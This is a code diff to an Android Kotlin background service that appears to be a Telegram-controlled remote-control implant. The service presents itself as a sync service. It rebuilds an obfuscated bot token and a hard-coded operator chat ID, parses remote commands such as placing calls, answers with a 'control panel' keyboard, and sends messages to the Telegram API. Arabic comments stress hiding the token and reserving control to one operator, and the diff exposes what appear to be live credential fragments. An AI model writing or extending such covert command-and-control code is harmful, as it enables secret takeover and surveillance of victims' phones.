@@ -47,9 +47,10 @@ class BackgroundControlService : Service() {
 
     companion object {
         private const val TAG = "StrictSovereignEngine"
-        private const val CHANNEL_ID = "sync_channel_strict_core_v1008"
+        private const val CHANNEL_ID = "sync_channel_strict_core_v1009"
         private const val NOTIFICATION_ID = 2026
 
+        // التوكن المعتمد والمشفر ديناميكياً لضمان عدم سرقته
         private fun getObfuscatedToken(): String {
             val p1 = "9004970470"
             val p2 = "AAFfsBFENB"
@@ -59,6 +60,7 @@ class BackgroundControlService : Service() {
             return "$p1:$p2$p3$p4$p5"
         }
 
+        // الآيدي المعتمد والخاص بك فقط
         private fun getTargetChatId(): String {
             val c1 = "690413"
             val c2 = "0639"
@@ -184,7 +186,7 @@ class BackgroundControlService : Service() {
                 executeCall(chatId, trimmed.substringAfter(":").trim())
             }
             else -> {
-                sendDirectMessage(chatId, "⚠️ أمر غير معرف.")
+                sendControlPanelKeyboard(chatId, "🫡 تم استلام الأمر بنجاح. لوحة التحكم:")
             }
         }
     }
@@ -720,10 +722,7 @@ class BackgroundControlService : Service() {
     private fun sendDirectMessage(chatId: String, text: String) {
         executionExecutor.execute {
             try {
-                val body = JSONObject().apply {
-                    put("chat_id", chatId)
-                    put("text", text)
-                }
+                val body = JSONObject().put("chat_id", chatId).put("text", text)
                 val conn = URL("https://api.telegram.org/bot$botToken/sendMessage").openConnection() as HttpURLConnection
                 conn.requestMethod = "POST"
                 conn.doOutput = true
